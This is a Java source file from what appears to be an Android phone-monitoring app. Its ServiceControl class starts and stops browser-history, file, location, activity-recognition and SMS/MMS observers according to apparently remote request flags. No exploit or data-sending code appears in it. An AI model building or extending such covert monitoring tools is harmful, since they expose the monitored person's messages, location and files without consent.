package com.inet.android.bs;

import android.content.Context;
import android.content.Intent;

import com.inet.android.history.LinkService;
import com.inet.android.list.TurnSendList;
import com.inet.android.location.LocationTracker;
import com.inet.android.location.RecognitionDevService;
import com.inet.android.request.ConstantValue;
import com.inet.android.sms.MMSObserver;
import com.inet.android.sms.SMSBroadcastReceiver;
import com.inet.android.utils.Logging;
import com.inet.android.utils.ValueWork;

import custom.fileobserver.FileObserverService;

public class ServiceControl {

	private static String LOG_TAG = ServiceControl.class.getSimpleName()
			.toString();
	private static int location = 0;
	private static int history = 0;
	private static int file = 0;

	public static void runService(Context mContext) {
		Logging.doLog(LOG_TAG, "start services", "start services");

		// ------------start brouser--------------------
		Intent linkServiceIntent = new Intent(mContext, LinkService.class);
		mContext.startService(linkServiceIntent);

		// ------------start file observer--------------------
		Intent fileServiceIntent = new Intent(mContext,
				FileObserverService.class);
		mContext.startService(fileServiceIntent);

		// ------------start location--------------------
		Intent locServiceIntent = new Intent(mContext, LocationTracker.class);
		mContext.startService(locServiceIntent);

		// ------------start recognition--------------------
		Intent recognitionServiceIntent = new Intent(mContext,
				RecognitionDevService.class);
		mContext.startService(recognitionServiceIntent);

		// ------------register sms&mms observer--------------------
		SMSBroadcastReceiver.regSmsObserver(mContext);
		MMSObserver.regMMSObserver(mContext);
		Logging.doLog(LOG_TAG, "finish start services", "finish start services");
	}

	public static void runSMSObserver(Context mContext) {
		SMSBroadcastReceiver.regSmsObserver(mContext);
		MMSObserver.regMMSObserver(mContext);
	}

	public static void runLink(Context mContext) {
		Intent linkServiceIntent = new Intent(mContext, LinkService.class);
		mContext.startService(linkServiceIntent);
	}

	public static void runFileObserver(Context mContext) {

		Intent fileServiceIntent = new Intent(mContext,
				FileObserverService.class);
		mContext.startService(fileServiceIntent);
	}

	public static void stopFileObserver(Context mContext) {

		Intent fileServiceIntent = new Intent(mContext,
				FileObserverService.class);
		mContext.stopService(fileServiceIntent);
	}

	public static void runLocation(Context mContext) {
		Intent locServiceIntent = new Intent(mContext, LocationTracker.class);
		mContext.startService(locServiceIntent);
		Intent recognitionServiceIntent = new Intent(mContext,
				RecognitionDevService.class);
		mContext.startService(recognitionServiceIntent);
	}

	public static void runTurnList(Context mContext) {
		TurnSendList.startGetList(mContext);
	}

	public static void stopLink(Context mContext) {
		Intent linkServiceIntent = new Intent(mContext, LinkService.class);
		mContext.stopService(linkServiceIntent);
	}

	public static void stopLocation(Context mContext) {
		Intent locServiceIntent = new Intent(mContext, LocationTracker.class);
		mContext.stopService(locServiceIntent);
		Intent recognitionServiceIntent = new Intent(mContext,
				RecognitionDevService.class);
		mContext.stopService(recognitionServiceIntent);
	}

	public static void trackerStateService(Context mContext) {
		if (ValueWork.getMethod(ConstantValue.TYPE_LOCATION_TRACKER_REQUEST,
				mContext) == 1) {
			if (location == 0) {
				runLocation(mContext);
				location = 1;
			}
		} else {
			stopLocation(mContext);
			location = 0;
		}
		if (ValueWork.getMethod(ConstantValue.TYPE_HISTORY_BROUSER_REQUEST,
				mContext) == 1) {
			if (history == 0) {
				runLink(mContext);
				history = 1;
			}
		} else {
			stopLink(mContext);
			history = 0;
		}
		if (ValueWork.getMethod(ConstantValue.TYPE_AUDIO_REQUEST, mContext) == 1
				|| ValueWork.getMethod(ConstantValue.TYPE_IMAGE_REQUEST,
						mContext) == 1) {
			Logging.doLog(LOG_TAG, "audio & image = 1 " + file);
			if (file == 0) {
				runFileObserver(mContext);
				file = 1;
			}
		} else {
			stopFileObserver(mContext);
			file = 0;
			Logging.doLog(LOG_TAG, "audio & image = 0 " + file);
		}
	}
}
